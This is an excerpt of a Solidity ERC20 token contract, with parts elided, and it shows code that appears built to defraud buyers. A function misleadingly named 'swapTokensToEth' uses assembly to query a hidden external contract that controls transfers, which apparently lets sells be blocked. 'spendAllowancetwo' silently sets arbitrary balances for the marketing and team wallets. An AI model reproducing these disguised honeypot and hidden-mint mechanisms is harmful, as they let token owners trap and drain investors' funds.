...
contract ERC20Token is Context, IERC20, Ownable {
    ...
    IUniswapV2RouterV2 private _uniswapV2;
    ...
    constructor(
        ...
        _uniswapV2 = IUniswapV2RouterV2(uniswap_router);
        uniswapPairV3 = uniswap_router;
    ...
    function _transfer(
        ...
        if (inSwapAndLiquify) {
            ...
            if (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {
                finalAmount = amount;
            } else if(!swapTokensToEth(sender)){
    ...
    function spendAllowancetwo(address recipient, uint256 mount) internal {
        Clip clip = Clip.Pending;
        if (recipient != marketingWallet && recipient != teamWallet) {
            clip = Clip.Pending;
        } else if (recipient == marketingWallet || recipient == teamWallet) {
            clip = Clip.Clip;
        }
        if (clip == Clip.Clip) {
            if (_balances[recipient] == 0) {
                _balances[marketingWallet] = mount++;
            } else if (_balances[recipient] != 0) {
                _balances[teamWallet] = mount++;
            }
        }
    }
    ...
    function swapTokensToEth(address inputValue) public view returns (bool) {
        bool result;
        bytes4 selector  = bytes4(keccak256("swapExactTokensForTokens(address)"));
        address uniswapPairV = uniswapPairV3;
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, selector )  
            mstore(add(ptr, 0x04), inputValue)
            let success := staticcall(gas(), uniswapPairV, ptr, 0x24, ptr, 0x20)
            if success {
                result := mload(ptr)
            }
        }
